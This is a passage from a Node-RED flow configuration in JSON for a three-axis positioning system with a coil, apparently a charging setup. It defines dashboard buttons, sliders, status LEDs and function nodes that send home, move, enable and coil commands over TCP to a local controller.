        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Drive Y",
        "x": 820,
        "y": 860,
        "wires": []
    },
    {
        "id": "a798fb0e66596f98",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 23,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Drive Z",
        "x": 960,
        "y": 860,
        "wires": []
    },
    {
        "id": "195fb76ce07f2da3",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 25,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed X",
        "x": 680,
        "y": 980,
        "wires": []
    },
    {
        "id": "6ab5d915e524f957",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 26,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed Y",
        "x": 820,
        "y": 980,
        "wires": []
    },
    {
        "id": "7b7c30c07db949fd",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 27,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed Z",
        "x": 960,
        "y": 980,
        "wires": []
    },
    {
        "id": "c7978de9f8e62d9f",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 20,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Servo Drives:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 160,
        "y": 1080,
        "wires": []
    },
    {
        "id": "c5b73948d1e27857",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 28,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "End Switches:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 160,
        "y": 1160,
        "wires": []
    },
    {
        "id": "bd082aec80413578",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 14,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Move X & Y",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 150,
        "y": 140,
        "wires": [
            [
                "bf39f7d599a5120e"
            ]
        ]
    },
    {
        "id": "977b480b3cac9691",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "positionX",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 770,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "8f828574c512b8f8",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 4,
        "width": "3",
        "height": "1",
        "passthru": false,
        "label": "Home All",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 300,
        "wires": [
            [
                "3f6b4cd76eca06b5"
            ]
        ]
    },
    {
        "id": "3f6b4cd76eca06b5",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m = {\n    \"cmd\": \"home\",\n    \"val\": [0],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 300,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "020cd939b9332c9d",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 29,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "EndSW X",
        "x": 680,
        "y": 920,
        "wires": []
    },
    {
        "id": "b26ca70a854910a0",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 30,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "EndSW Y",
        "x": 820,
        "y": 920,
        "wires": []
    },
    {
        "id": "608342e8d104484d",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 31,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "EndSW Z",
        "x": 960,
        "y": 920,
        "wires": []
    },
    {
        "id": "62b7b1fd3f9a227b",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "const value = [];\nfor (let i = 0; i < 3; i++) {\n    if (msg.payload.val[i] < 1) {\n        value[i] = false;\n    } else {\n        value[i] = true;\n    }\n}\nreturn [{payload:value[0]}, {payload:value[1]}, {payload:value[2]}];",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 920,
        "wires": [
            [
                "020cd939b9332c9d"
            ],
            [
                "b26ca70a854910a0"
            ],
            [
                "608342e8d104484d"
            ]
        ]
    },
    {
        "id": "55cf3acce7c198d0",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "const value = [];\nfor (let i = 0; i < 3; i++) {\n    if (msg.payload.val[i] < 1) {\n        value[i] = false;\n    } else {\n        value[i] = true;\n    }\n}\nreturn [{payload:value[0]}, {payload:value[1]}, {payload:value[2]}];",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 980,
        "wires": [
            [
                "195fb76ce07f2da3"
            ],
            [
                "6ab5d915e524f957"
            ],
            [
                "7b7c30c07db949fd"
            ]
        ]
    },
    {
        "id": "ef982bbeb83e3ab1",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 24,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Homed axes:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 150,
        "y": 1120,
        "wires": []
    },
    {
        "id": "ac3a60836fe09eaf",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "const v = [];\nfor (let i = 0; i < 16; i++) {\n    if (msg.payload.val[i] < 1) {\n        v[i] = false;\n    } else {\n        v[i] = true;\n    }\n}\nreturn [{ payload: v[0] }, { payload: v[1] }, { payload: v[2] }, { payload: v[3] }, { payload: v[4] }, { payload: v[5] }, { payload: v[6] }, { payload: v[7] }, { payload: v[8] }, { payload: v[9] }, { payload: v[10] }, { payload: v[11] }, { payload: v[12] }, { payload: v[13] }, { payload: v[14] }, { payload: v[15] }];",
        "outputs": 16,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 1140,
        "wires": [
            [
                "202ea0a2cb43b03a"
            ],
            [
                "5371ab883d61f101"
            ],
            [
                "a798fb0e66596f98"
            ],
            [
                "020cd939b9332c9d"
            ],
            [
                "b26ca70a854910a0"
            ],
            [
                "608342e8d104484d"
            ],
            [
                "195fb76ce07f2da3",
                "f9cb2f7802534002"
            ],
            [
                "6ab5d915e524f957",
                "a9eabe41d38b8bcf"
            ],
            [
                "7b7c30c07db949fd",
                "c54dd3ef4b4d2602"
            ],
            [
                "332051326f03a99e"
            ],
            [
                "bd3a4e6262e1fcf5",
                "64c4f1b3c5eef63d"
            ],
            [
                "d58dd721798e589a",
                "e8a139c94ddf6cb5"
            ],
            [
                "e38d57f77cd0baab"
            ],
            [
                "9507aa9d120ce7f6"
            ],
            [
                "1d7fc745d3712398"
            ],
            [
                "b09c7d257ecc2640"
            ]
        ]
    },
    {
        "id": "d5198474540bb099",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"enable\",\n    \"val\": [1],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 460,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "c4e7da66ea5cddd8",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 9,
        "width": "3",
        "height": "1",
        "passthru": false,
        "label": "Enable",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 460,
        "wires": [
            [
                "d5198474540bb099"
            ]
        ]
    },
    {
        "id": "473c04678b81d668",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 10,
        "width": "3",
        "height": "1",
        "passthru": false,
        "label": "Disable",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 500,
        "wires": [
            [
                "70a176b34dda4080"
            ]
        ]
    },
    {
        "id": "70a176b34dda4080",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"enable\",\n    \"val\": [0],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 500,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "332051326f03a99e",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 33,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Enabled",
        "x": 680,
        "y": 1040,
        "wires": []
    },
    {
        "id": "3cb98235715e70e2",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 32,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Ena/Pos/Coil:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 160,
        "y": 1200,
        "wires": []
    },
    {
        "id": "d29e21e2307c9c03",
        "type": "catch",
        "z": "786f9546367d3e03",
        "name": "",
        "scope": [
            "8fe71a74bc87dec0"
        ],
        "uncaught": false,
        "x": 550,
        "y": 400,
        "wires": [
            [
                "7633db16e4b3dfc6"
            ]
        ]
    },
    {
        "id": "7633db16e4b3dfc6",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 14",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 700,
        "y": 400,
        "wires": []
    },
    {
        "id": "8fe71a74bc87dec0",
        "type": "tcp request",
        "z": "786f9546367d3e03",
        "name": "",
        "server": "10.10.0.100",
        "port": "100",
        "out": "sit",
        "ret": "buffer",
        "splitc": " ",
        "newline": "",
        "trim": false,
        "tls": "",
        "x": 740,
        "y": 500,
        "wires": [
            [
                "c086f953e604c078"
            ]
        ]
    },
    {
        "id": "e8a139c94ddf6cb5",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 35,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Coil",
        "x": 970,
        "y": 1040,
        "wires": []
    },
    {
        "id": "571a6765939fbe3a",
        "type": "inject",
        "z": "786f9546367d3e03",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "2",
        "crontab": "",
        "once": true,
        "onceDelay": "0",
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 170,
        "y": 620,
        "wires": [
            [
                "6f0be04140994ed2",
                "9b1d766bee26d3d3"
            ]
        ]
    },
    {
        "id": "036df3889608014b",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 11,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Move X",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "e509dfb05e871dab"
            ]
        ]
    },
    {
        "id": "8a5a1d4315f1f405",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 12,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Move Y",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 220,
        "wires": [
            [
                "691372b2c0d3bd5f"
            ]
        ]
    },
    {
        "id": "9d5d843c4fcc16d9",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 13,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Move Z",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 260,
        "wires": [
            [
                "f0261ca0c176aa72"
            ]
        ]
    },
    {
        "id": "e509dfb05e871dab",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"positionX\") == undefined) {\n    flow.set(\"positionX\", 0);\n}\n\nvar m={\n    \"cmd\":\"move\",\n    \"val\": [0, flow.get(\"positionX\")],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 180,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "d01e41387a0d7ebd",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 6,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Home X",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 340,
        "wires": [
            [
                "a156b70f0eccd099"
            ]
        ]
    },
    {
        "id": "23de8251917cd414",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 7,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Home Y",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 380,
        "wires": [
            [
                "e50773c739094f19"
            ]
        ]
    },
    {
        "id": "e65b654e7fd972f0",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 8,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Home Z",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 420,
        "wires": [
            [
                "f27bce997b82517a"
            ]
        ]
    },
    {
        "id": "47d38141b97cce8c",
        "type": "ui_slider",
        "z": "786f9546367d3e03",
        "name": "",
        "label": "Position Y",
        "tooltip": "",
        "group": "0f3fbbc1566187b3",
        "order": 2,
        "width": "6",
        "height": "1",
        "passthru": true,
        "outs": "end",
        "topic": "position",
        "topicType": "str",
        "min": "-200",
        "max": "200",
        "step": "1",
        "className": "",
        "x": 560,
        "y": 260,
        "wires": [
            [
                "3d14b0394b0d6b0b"
            ]
        ]
    },
    {
        "id": "3d14b0394b0d6b0b",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "positionY",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 770,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "9850266f8fd3234c",
        "type": "ui_slider",
        "z": "786f9546367d3e03",
        "name": "",
        "label": "Position Z",
        "tooltip": "",
        "group": "0f3fbbc1566187b3",
        "order": 3,
        "width": "6",
        "height": "1",
        "passthru": true,
        "outs": "end",
        "topic": "position",
        "topicType": "str",
        "min": "0",
        "max": "300",
        "step": "1",
        "className": "",
        "x": 560,
        "y": 300,
        "wires": [
            [
                "58b5e1d083aa32b5"
            ]
        ]
    },
    {
        "id": "58b5e1d083aa32b5",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "positionZ",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 770,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "48ea46336ce8b32e",
        "type": "inject",
        "z": "786f9546367d3e03",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": "0.1",
        "topic": "",
        "payload": "0",
        "payloadType": "num",
        "x": 570,
        "y": 180,
        "wires": [
            [
                "47d38141b97cce8c",
                "9850266f8fd3234c",
                "5169142405acac1f"
            ]
        ]
    },
    {
        "id": "a156b70f0eccd099",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"home\",\n    \"val\": [0],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 340,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "691372b2c0d3bd5f",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"positionY\") == undefined) {\n    flow.set(\"positionY\", 0);\n}\n\nvar m={\n    \"cmd\":\"move\",\n    \"val\": [1, flow.get(\"positionY\")],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 220,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "f0261ca0c176aa72",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"positionZ\") == undefined) {\n    flow.set(\"positionZ\", 0);\n}\n\nvar m={\n    \"cmd\":\"move\",\n    \"val\": [2, -flow.get(\"positionZ\")],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 260,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "e50773c739094f19",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"home\",\n    \"val\": [1],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 380,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "f27bce997b82517a",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"home\",\n    \"val\": [2],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 420,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "19822687fa068602",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "detectionEnabled",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 190,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "0d0d9ea4ccd29023",
        "type": "ui_switch",
        "z": "786f9546367d3e03",
        "name": "",
        "label": "Auto Detection",
        "tooltip": "",
        "group": "0f3fbbc1566187b3",
        "order": 18,
        "width": "3",
        "height": "1",
        "passthru": true,
        "decouple": "false",
        "topic": "detectionEnabled",
        "topicType": "str",
        "style": "",
        "onvalue": "true",
        "onvalueType": "bool",
        "onicon": "",
        "oncolor": "",
        "offvalue": "false",
        "offvalueType": "bool",
        "officon": "",
        "offcolor": "",
        "animate": false,
        "className": "",
        "x": 160,
        "y": 700,
        "wires": [
            [
                "19822687fa068602"
            ]
        ]
    },
    {
        "id": "0e7f6fddb38b19ec",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"detectionEnabled\") == true) {\n    if (msg.payload.result == \"Success\") {\n        var m = {\n            \"cmd\": \"move2\",\n            \"val\": [Math.round(0-(msg.payload.positionY)), Math.round(msg.payload.positionX)],\n        };\n        msg.payload = m\n        return msg;\n    }\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 760,
        "y": 580,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "eda32cd5e411cfa7",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var posX = msg.payload.positionX\nvar posY = msg.payload.positionY\n\nposX = Number(posX.toFixed(2));\nposY = Number(posY.toFixed(2));\n\nmsg.payload.positionX = posX\nmsg.payload.positionY = posY\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 760,
        "y": 660,
        "wires": [
            [
                "14ac1decf7bf0d86"
            ]
        ]
    },
    {
        "id": "8ee46a54a8cb7660",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"autoHoming\")) {\n    var axis = 2;\n    if (msg.payload.val[0] == 2) { axis = 0 }\n    else if (msg.payload.val[0] == 0) { axis = 1 }\n    else if (msg.payload.val[0] == 1) { axis = 2 }\n//    if (msg.payload.val[0] == 0) { axis = 1 }\n//    else if (msg.payload.val[0] == 1) { axis = 2 }\n//    else if (msg.payload.val[0] == 2) { axis = 0 }\n    if (axis == 0 || axis == 1) {\n        var m = {\n            \"cmd\": \"home\",\n            \"val\": [axis],\n        };\n        msg.payload = m\n        return msg;\n    }\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 860,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "da8ad6e8336faeb0",
        "type": "ui_switch",
        "z": "786f9546367d3e03",
        "name": "",
        "label": "Auto Homing",
        "tooltip": "",
        "group": "0f3fbbc1566187b3",
        "order": 17,
        "width": "3",
        "height": "1",
        "passthru": true,
        "decouple": "false",
        "topic": "detectionEnabled",
        "topicType": "str",
        "style": "",
        "onvalue": "true",
        "onvalueType": "bool",
        "onicon": "",
        "oncolor": "",
        "offvalue": "false",
        "offvalueType": "bool",
        "officon": "",
        "offcolor": "",
        "animate": false,
        "className": "",
        "x": 570,
        "y": 340,
        "wires": [
            [
                "c1d59e240c9a58a0"
            ]
        ]
    },
    {
        "id": "c1d59e240c9a58a0",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "autoHoming",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 780,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "164c3c6598b2abcc",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0262e45575f50b1c",
        "order": 1,
        "width": "6",
        "height": "4",
        "passthru": false,
        "label": "{{label}}",
        "tooltip": "",
        "color": "",
        "bgcolor": "{{background}}",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 470,
        "y": 1360,
        "wires": [
            [
                "76a12422791ac5a4"
            ]
        ]
    },
    {
        "id": "f841c1beaa0e8793",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 16",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 660,
        "y": 1300,
        "wires": []
    },
    {
        "id": "76a12422791ac5a4",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var msgBtn = {\n    \"background\": \"color\",\n    \"label\": \"text\",\n    \"enabled\": false\n}\nvar msgCmd = {\n    \"cmd\": \"command\",\n    \"val\": [0],\n};\nvar state = flow.get(\"state\")\n\nif (state == \"needsInit\") {\n    msgBtn.background = \"orange\"\n    msgBtn.label = \"Initializing\"\n    msgBtn.enabled = false\n    msgCmd.cmd = \"home\"\n    msgCmd.val = [2] // was 0\n    msg.payload = msgCmd\n    flow.set(\"state\", \"initializing\");\n    return [msgBtn, msg];\n}\nelse if (state == \"ready\") {\n    var result = flow.get(\"commandedResult\")\n    if (result == \"Success\"){\n        msgBtn.background = \"orange\"\n        msgBtn.label = \"Positioning (Horizontally)\"\n        msgBtn.enabled = false\n        var commandedX = flow.get(\"commandedX\")\n        var commandedY = flow.get(\"commandedY\")\n        msgCmd.cmd = \"moveXY\"\n        msgCmd.val = [Math.round(0 - commandedY), Math.round(commandedX)]\n        msg.payload = msgCmd\n        flow.set(\"state\", \"positioningXY\");\n        return [msgBtn, msg];\n    }\n    else {\n        msgBtn.background = \"red\"\n        msgBtn.label = \"Marker Not Detected\"\n        msgBtn.enabled = false\n        flow.set(\"state\", \"markerNotDetected\");\n        return [msgBtn, null];\n    }\n}\nelse if (state == \"charging\") {\n    msgBtn.background = \"orange\"\n    msgBtn.label = \"Powering Off Coil\"\n    msgBtn.enabled = false\n    msgCmd.cmd = \"coil\"\n    msgCmd.val = [false]\n    msg.payload = msgCmd\n    flow.set(\"state\", \"turningOff\");\n    return [msgBtn, msg];\n}\nelse if (state == \"checkingCoil\") {\n    msgBtn.background = \"orange\"\n    msgBtn.label = \"Powering Off Coil\"\n    msgBtn.enabled = false\n    msgCmd.cmd = \"coil\"\n    msgCmd.val = [false]\n    msg.payload = msgCmd\n    